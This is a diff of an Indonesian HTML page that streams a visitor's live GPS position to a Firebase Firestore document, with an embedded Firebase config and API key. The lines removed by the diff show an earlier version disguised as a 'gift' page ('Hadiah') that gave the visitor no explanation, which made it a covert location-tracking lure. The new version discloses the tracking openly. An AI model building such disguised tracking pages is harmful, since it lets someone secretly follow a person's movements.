@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Hadiah</title>
+  <title>Kirim Lokasi Realtime</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
@@ -14,18 +14,19 @@
       margin-top: 20px;
       color: green;
     }
+    .error {
+      color: red;
+    }
   </style>
 </head>
 <body>
-  <h2></h2>
-  <p class="status">Tunggu sebentar</p>
+  <h2>Kirim Lokasi Realtime</h2>
+  <p class="status" id="status">Menunggu lokasi... (aktifkan GPS Anda)</p>
 
   <script type="module">
-    // Firebase SDK
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
     import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-    // Konfigurasi Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyC1pLpsAE5QJv26cEudkY6FoqzEoD9KM",
       authDomain: "posisi-saya.firebaseapp.com",
@@ -37,9 +38,8 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
-    const statusEl = document.querySelector('.status');
+    const statusEl = document.getElementById('status');
 
-    // Fungsi update ke Firestore
     const updateLocation = (lat, lng) => {
       const lokasiRef = doc(db, "lokasi_saya", "realtime");
       setDoc(lokasiRef, {
@@ -47,28 +47,31 @@
         lng: lng,
         waktu: new Date().toISOString()
       }).then(() => {
-        statusEl.textContent = `: ${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+        statusEl.textContent = "Lokasi berhasil dikirim.";
+        statusEl.classList.remove('error');
       }).catch(err => {
-        statusEl.textContent = '';
+        statusEl.textContent = "Gagal kirim lokasi.";
+        statusEl.classList.add('error');
         console.error(err);
       });
     };
 
-    // Ambil lokasi realtime dari GPS
     if (navigator.geolocation) {
       navigator.geolocation.watchPosition((pos) => {
         const lat = pos.coords.latitude;
         const lng = pos.coords.longitude;
         updateLocation(lat, lng);
       }, (err) => {
-        statusEl.textContent = "";
+        statusEl.textContent = "⚠️ Lokasi tidak tersedia. Aktifkan GPS atau izinkan akses lokasi.";
+        statusEl.classList.add('error');
       }, {
         enableHighAccuracy: true,
         maximumAge: 5000,
         timeout: 10000
       });
     } else {
-      statusEl.textContent = "";
+      statusEl.textContent = "Browser tidak mendukung geolokasi.";
+      statusEl.classList.add('error');
     }
   </script>
 </body>
